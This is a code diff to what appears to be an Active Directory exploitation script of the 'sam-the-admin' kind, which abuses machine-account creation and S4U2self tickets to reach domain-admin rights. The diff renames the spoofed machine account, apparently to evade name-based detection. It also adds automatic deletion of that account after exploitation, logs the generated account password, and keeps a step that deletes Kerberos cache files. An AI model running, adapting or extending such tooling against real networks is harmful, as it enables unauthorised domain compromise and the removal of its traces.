@@ -20,14 +20,14 @@ import ldap3
 import time
 
 from utils.helper import *
-from utils.addcomputer import AddComputerSAMR
+from utils.addcomputer import AddComputerSAMR, DelComputerSAMR
 from utils.S4U2self import GETST
 
 characters = list(string.ascii_letters + string.digits + "!@#$%^&*()")
 
 
 def samtheadmin(options):
-    new_computer_name = f"SAMTHEADMIN-{random.randint(1,100)}$" 
+    new_computer_name = f"CTHULHU-FHTAGN-{random.randint(1,100)}$" 
     new_computer_password = ''.join(random.choice(characters) for _ in range(12))
 
     domain, username, password, lmhash, nthash = parse_identity(options)
@@ -142,6 +142,18 @@ def samtheadmin(options):
 
     if options.purge:
         os.system("rm *.ccache")
+
+    logging.info(f'Deleting Computer Account "{new_computer_name}"')
+    logging.info(f'MachineAccount "{new_computer_name}" password = {new_computer_password}')
+
+    # Creating Machine Account
+    delmachineaccount = DelComputerSAMR(
+        random_domain_admin, 
+        None, 
+        domain, 
+        options,
+        computer_name=new_computer_name)
+    delmachineaccount.run()
 
 
 if __name__ == '__main__':
